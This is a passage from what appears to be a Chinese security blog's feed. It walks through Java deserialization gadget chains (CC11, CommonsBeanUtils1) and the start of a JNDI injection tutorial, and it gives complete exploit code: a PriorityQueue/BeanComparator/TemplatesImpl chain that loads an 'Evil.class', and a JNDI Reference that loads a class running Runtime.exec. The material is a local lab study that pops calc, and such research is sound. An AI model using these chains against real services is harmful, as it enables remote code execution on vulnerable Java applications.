oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc11.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有一个小问题就是关于这里最后为什么innermap里存在一个<code>&#123;&quot;n4c1&quot;: 1&#125;</code>键值对(因此我们需要 innermap.remove(“n4c1”);把它删掉)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innermap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;cabbage&quot;</span>);</span><br><span class="line">        innermap.remove(<span class="string">&quot;n4c1&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里我也不知道是怎么回事, 大概是TiedMapEntry触发了LazyMap的懒加载机制, 但是调试了很久也没有定位到</p><p>其他的细节问题在CC6中已经分析过了这里就不赘述了</p><p>那么CC11就算完成了</p><h2 id="CommonsBeanUtils1"><a href="#CommonsBeanUtils1" class="headerlink" title="CommonsBeanUtils1"></a>CommonsBeanUtils1</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>jdk8无限制, 我这里依然使用jdk8u65</p><p>其他依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>关于JavaBean可以参考廖雪峰老师官方网站</p><p><a href="https://liaoxuefeng.com/books/java/oop/core/javabean/">https://liaoxuefeng.com/books/java/oop/core/javabean/</a></p><p>实际上JavaBean就是对一个Java类的标准封装方法, 我们只需要使用它的getter和setter方法来操作其中的property, 而不需要关系其具体实现过程</p><p>在Commons-BeanUtils 中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意 JavaBean 的 getter 方法</p><p>例如我们有一个Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就是一个JavaBean的写法</p><p>使用PropertyUtils.getProperty调用getter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>), <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出结果: n4c1</span></span><br></pre></td></tr></table></figure><p>这会根据传入的参数自动找到对应的getter也就是getName方法</p><h3 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h3><p>所以我们为什么要说到getProperty这个方法呢?</p><p>回顾一下我们在使用恶意加载类时的TemplatesImpl这个类</p><p>进入这个类的第一跳是newTransformer方法, 如果再往前推一跳, 看谁调用了newTransformer方法,可以找到这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725144545883.png" alt="image-20240725144545883"></p><p>这个写法正是一个getter, 并且作用域为 public, 我们就可以使用PropertyUtils.getProperty来调用</p><p>那么这部分链子大概就是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725145217573.png" alt="image-20240725145217573"></p><p>接下来就是从getProperty方法把链子向反序列化入口readObject延申</p><p>谁调用了getProperty?</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725145938804.png" alt="image-20240725145938804"></p><p>在BeanComparator这个类中的compare方法中有两处调用</p><p>这个compare在其他类中使用的非常多, 我们需要找到一个可序列化的类来延申链子</p><p>这里我们找到之前使用过的一个类 PriorityQueue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725150808043.png" alt="image-20240725150808043"></p><p>在siftDownUsingComparator方法中调用了compare</p><p>继续找siftDownUsingComparator的调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725150928391.png" alt="image-20240725150928391"></p><p>在同一个类中, siftDown对其进行了调用</p><p>继续</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725151033240.png" alt="image-20240725151033240"></p><p>在同一个类中heapify调用了siftDown</p><p>再进一步我们就会发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725151145897.png" alt="image-20240725151145897"></p><p>同一个类的readObject调用了heapify</p><p>实际上熟悉的师傅们都知道这其实就是CC4的前半链</p><p>串联起来大概是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725153027846.png" alt="image-20240725153027846"></p><p>接下来就是依照这个流程来手写exp了</p><p>首先我们确定从compare开始这条链子是通的</p><p>如图代码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725160518504.png" alt="image-20240725160518504"></p><p>由于add是会触发compare比较的(有兴趣的师傅可以调式看看), 所以反射赋值</p><p>还有outputProperties这个值也需要反射赋值进去, 不然会抛出错误导致序列化失败</p><p>所以最终应该是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] objects = &#123;templates, <span class="number">1</span>&#125;;</span><br><span class="line">        queue.set(priorityQueue, objects);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">property</span> <span class="operator">=</span> BeanComparator.class.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">        property.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        property.set(beanComparator, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line"></span><br><span class="line">        unserialize(<span class="string">&quot;CB1.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CB1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(name));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注:</p><p>这里的PriorityQueue的queue属性虽然被transient修饰为不可序列化, 但是PriorityQueue自定义类writeObject方法来序列化queue中的内容</p></blockquote><p>我们只反序列化看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725171752965.png" alt="image-20240725171752965"></p><p>成功执行</p><h2 id="总结-完整流程图"><a href="#总结-完整流程图" class="headerlink" title="总结(完整流程图)"></a>总结(完整流程图)</h2><p>这两条链子的整个流程:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/CC11%20%26%20CommonsBeanUtils1.png" alt="CC11 &amp; CommonsBeanUtils1"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;遗漏的CC11和CommonsBeanUtils链&quot;&gt;&lt;a href=&quot;#遗漏的CC11和CommonsBeanUtils链&quot; class=&quot;headerlink&quot; title=&quot;遗漏的CC11和CommonsBeanUtils链&quot;&gt;&lt;/a&gt;遗漏的CC11和Com</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入初探</title>
    <link href="http://example.com/2024/07/12/JNDI%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2024/07/12/JNDI%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/</id>
    <published>2024-07-12T14:07:13.000Z</published>
    <updated>2024-07-25T12:21:53.514Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入初探"><a href="#JNDI注入初探" class="headerlink" title="JNDI注入初探"></a>JNDI注入初探</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tttang.com/archive/1611/">https://tttang.com/archive/1611/</a></p><p><a href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a></p><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></p><h2 id="JNDI-的利用方式"><a href="#JNDI-的利用方式" class="headerlink" title="JNDI 的利用方式"></a>JNDI 的利用方式</h2><h3 id="JNDI结合RMI"><a href="#JNDI结合RMI" class="headerlink" title="JNDI结合RMI"></a>JNDI结合RMI</h3><p>首先上服务端和客户端代码</p><p>Server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello, &quot;</span> + name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObjImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, remoteObjImpl);</span><br><span class="line">        System.out.println(<span class="string">&quot;运行中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JndiRmiServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RMI原生的漏洞"><a href="#RMI原生的漏洞" class="headerlink" title="RMI原生的漏洞"></a>RMI原生的漏洞</h4><p>首先跟一下调试, 证明JNDI的rmi服务实际上还是调用了原生的RMI</p><p>我们在客户端的这里打断点, 一直跟lookup方法(详细见参考链接)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240712230751811.png" alt="image-20240712230751811"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240712230544299.png" alt="image-20240712230544299"></p><p>可以看见最后还是执行了我们熟悉的RegistryImpl_Stub类的lookup方法</p><p>因此rmi存在的漏洞这里也是适用的</p><h4 id="引用的漏洞，Normal-Jndi"><a href="#引用的漏洞，Normal-Jndi" class="headerlink" title="引用的漏洞，Normal Jndi"></a>引用的漏洞，Normal Jndi</h4><ul><li>这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。</li></ul><p>这个漏洞与服务端调用了一个 <code>Reference</code> 对象有关</p><p>它类似于一个代理, 从外部url加载一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br></pre></td></tr></table></figure><p>我们先来看对应Reference的构造函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713153750900.png" alt="image-20240713153750900"></p><p>后两个参数 factory, factoryLocation, 不禁让人联想到工厂模式这一设计理念, factoryLocation就是对象工厂的位置(我们的是http), factory为对象工厂名, 前面的className就是要实例化的类既然要实例化, 那它的构造函数就会被调用, 因此可以构造一个恶意类, 其构造函数中存放恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JndiCalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span 